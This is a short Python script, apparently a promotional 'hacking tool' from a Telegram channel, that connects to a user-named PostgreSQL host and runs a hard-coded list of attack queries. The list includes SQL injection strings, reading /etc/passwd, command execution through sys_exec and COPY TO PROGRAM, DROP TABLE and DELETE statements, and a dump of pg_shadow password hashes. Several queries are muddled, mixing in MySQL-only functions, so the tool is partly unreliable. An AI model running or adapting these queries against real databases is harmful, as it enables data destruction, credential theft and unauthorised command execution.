import psycopg2
import colorama
import random
import time

def execute_query(query, dbname, host):
    try:
        
        connection = psycopg2.connect(
            dbname=dbname,
            user="",
            password="",
            host=host
        )
        
        cursor = connection.cursor()
        
        
        cursor.execute(query)
        
        
        rows = cursor.fetchall()
        if rows:
            print(colorama.Fore.GREEN + "Query results:")
            for row in rows:
                print(row)
        else:
            print(colorama.Fore.YELLOW + "No results found.")
        
        
        cursor.close()
        connection.close()
    except Exception as e:
        print(colorama.Fore.RED + "Error executing query:", e)

queries = [
    "SELECT * FROM users WHERE username = 'admin' AND password = 'password' OR '1'='1';",
    "SELECT * FROM information_schema.tables;",
    "SELECT version();",
    "SELECT LOAD_FILE('/etc/passwd');",
    "COPY (SELECT table_name FROM information_schema.tables) TO '/tmp/tables.csv';",
    "SELECT * FROM users WHERE username = 'admin' OR 1=1 --' AND password = 'password';",
    "DELETE FROM users WHERE id = 1;",
    "INSERT INTO users (username, password) VALUES ('admin', 'password'); DROP TABLE users;",
    "SELECT sys_exec('ls -la');",
    "COPY (SELECT * FROM products) TO PROGRAM 'cat > /tmp/products.txt';",
    "SELECT * FROM users WHERE username = 'admin' UNION SELECT 1, 'password', 'email@example.com';",
    "SELECT column_name FROM information_schema.columns WHERE table_name = 'users';",
    "SELECT * FROM users, sensitive_data WHERE users.id = sensitive_data.user_id;",
    "SHOW GRANTS FOR 'username'@'localhost';",
    "SELECT * FROM pg_shadow;"
]

# Red ASCII banner
print(colorama.Fore.RED + """
            ╲┈┈┈┈╱
    ┈┈┈╱▔▔▔▔╲
    ┈┈┃┈▇┈┈▇┈┃
    ╭╮┣━━━━━━┫╭╮
    ┃┃┃┈┈┈┈┈┈┃┃┃
    ╰╯┃┈┈┈┈┈┈┃╰╯
    ┈┈╰┓┏━━┓┏╯
    ┈┈┈╰╯┈┈╰╯
    __        
    \  / | |__/ | |\ | / _`       
     \/  | |  \ | | \| \__>  
""")

print(colorama.Fore.CYAN + "Welcome to t.me/VikingTERMINAL. Visit my channel to get all my tools.\n")

host = input("Enter the host/domain name: ")

dbname = input("Enter the database name to test: ")

for query in queries:
    print("\nExecuting query:", query)
    for char in query:
        print(colorama.Fore.MAGENTA + char, end='', flush=True)
        time.sleep(random.uniform(0.01, 0.1))  
    execute_query(query, dbname, host)
